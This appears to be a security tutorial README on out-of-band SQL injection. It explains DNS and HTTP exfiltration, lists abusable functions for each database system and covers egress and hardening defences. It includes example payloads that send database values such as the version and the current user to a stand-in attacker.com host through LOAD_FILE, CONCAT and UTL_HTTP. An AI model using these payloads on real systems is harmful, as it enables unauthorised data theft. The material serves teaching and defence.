# Out-of-Band (OOB) SQL Injection — DNS & HTTP Exfiltration

> [!WARNING]
> **Ethics reminder:** OOB techniques cause the target to reach out to attacker-controlled infrastructure (DNS, HTTP). They are powerful and can exfiltrate data even when direct responses are suppressed. Use OOB methods **only** in authorized, controlled environments (labs or explicit penetration-test scopes). Do not use them against systems you do not have written permission to test.

---

## What is Out-of-Band (OOB) SQL Injection?

OOB SQLi forces the database (or underlying server) to make network requests to an attacker-controlled service — typically via DNS or HTTP — carrying sensitive data in the request. This is useful when the application does not return query results and timing/content-based techniques are impractical.

Because OOB interactions leave fewer traces in the application response, they can be stealthy and highly effective if the target environment allows outbound network traffic.

---

## Common OOB channels

1. **DNS** — Use DNS lookups which include attacker-controlled subdomains containing exfiltrated data (e.g., `abcd.attacker.com`). DNS traffic often bypasses HTTP-only monitoring and can traverse firewalls.
2. **HTTP/HTTPS** — Trigger a server-side HTTP request to an attacker-controlled webserver with data embedded in the URL or headers.
3. **SMB/FTP/Other protocols** — Less common, but some services can be coerced into contacting SMB or FTP listeners.

DNS is the most popular OOB channel due to its ubiquity and ease of capturing requests (e.g., via DNS logging services or Burp Collaborator-like services).

---

## How OOB exfiltration works (high level)

1. Attacker registers or controls a domain (e.g., `attacker.com`) and sets up an authoritative DNS server or a collaborator service to log incoming DNS/HTTP requests.
2. Attacker crafts a SQL payload that forces the DB to perform a name resolution or HTTP request that contains data (e.g., concatenated values) as part of the hostname or URL.
3. When the DB performs the lookup/request, the attacker receives the data via logs or collaborator notifications.

**Example (conceptual):**

```sql
-- MySQL example (conceptual):
SELECT LOAD_FILE(CONCAT('\\', (SELECT @@version), '.attacker.com\share'));
```

Real payloads differ by DBMS and available functions.

---

## DBMS-specific OOB techniques & functions

* **MySQL:** `LOAD_FILE()`, `UTL_HTTP` equivalents are less common; MySQL often relies on functions in combination with file or network features — behavior depends on configuration and OS.
* **Postgres:** `COPY` to program, `dblink`, or functions like `pg_read_file` (privilege-dependent). `COPY`/`COPY ... PROGRAM` can sometimes trigger OOB if shell access exists.
* **MSSQL:** `xp_dirtree`, `xp_cmdshell` (if enabled) can cause outbound connections; `OPENROWSET` or `OPENDATASOURCE` can be abused to reach external resources.
* **Oracle:** `UTL_HTTP.REQUEST`, `UTL_INADDR.GET_HOST_ADDRESS`, `DBMS_LDAP` can be used to perform remote lookups; privileges often restrict these.

**Important:** Many of these functions require elevated privileges or OS-level access and are disabled in secure configurations. OOB success heavily depends on DB/user privileges and network egress rules.

---

## Example OOB payload patterns (illustrative and non-executable)

* **DNS exfiltration (conceptual):**

  * Inject a value that gets used in a DNS lookup: `CONCAT((SELECT user()), '.abc.attacker.com')` and force a lookup of that hostname.
* **HTTP exfiltration (conceptual):**

  * Use functions that perform HTTP requests, e.g., `UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user()))` in Oracle (requires privileges).

Because exact syntax varies by DBMS and environment, consult DB-specific documentation and the `examples/` folder for tested payloads in lab environments.

---

## Detection & defensive controls

1. **Egress filtering:** Block or strictly control outbound DNS/HTTP requests from database servers or application servers. Only allow necessary destinations.
2. **Network segmentation:** Databases should not be on networks with direct outbound internet access; use internal proxies and strict ACLs.
3. **Least privilege:** Disable privileged DB packages and functions (`xp_cmdshell`, `UTL_HTTP`, etc.) for application accounts.
4. **Monitor DNS & outbound logs:** Alert on unusual DNS queries (long, random-looking subdomains) or HTTP requests to unknown hosts.
5. **WAF & IDS:** While OOB often bypasses WAF protections, network IDS/monitoring can spot anomalous egress patterns.
6. **Hardening DB configuration:** Disable or restrict dangerous packages and functions where possible.

---

## Tools & services for testing (authorized)

* **Burp Collaborator / Burp OAST:** Provides a collaborator server for detecting OOB interactions. (Use only with permission — do not point to third-party collaborators for tests without consent.)
* **dnslog services / custom authoritative DNS:** For capturing DNS queries to attacker-controlled domains.
* **Local lab setups:** Use internal resolvers and logging to safely capture OOB requests.
* **sqlmap:** Supports some OOB techniques (`--os-shell`, `--dns-domain`), but requires careful, authorized use.

---

## Practical notes & caveats

* OOB requires that the DB or host can perform outbound network lookups — many hardened infrastructures disable this or place DBs behind strict egress rules.
* Some OOB functions require elevated DB privileges — success is less common in well-managed environments.
* OOB is high-value but can be noisy; it may trigger monitoring and rapid detection.

---

## Responsible testing guidance

> [!TIP]
> * Use your own infrastructure or an explicitly permitted collaborator for testing OOB techniques.
> * Notify stakeholders if you run tests that may trigger outbound traffic or alerts.
> * Avoid using third-party collaborator infrastructure on targets without permission.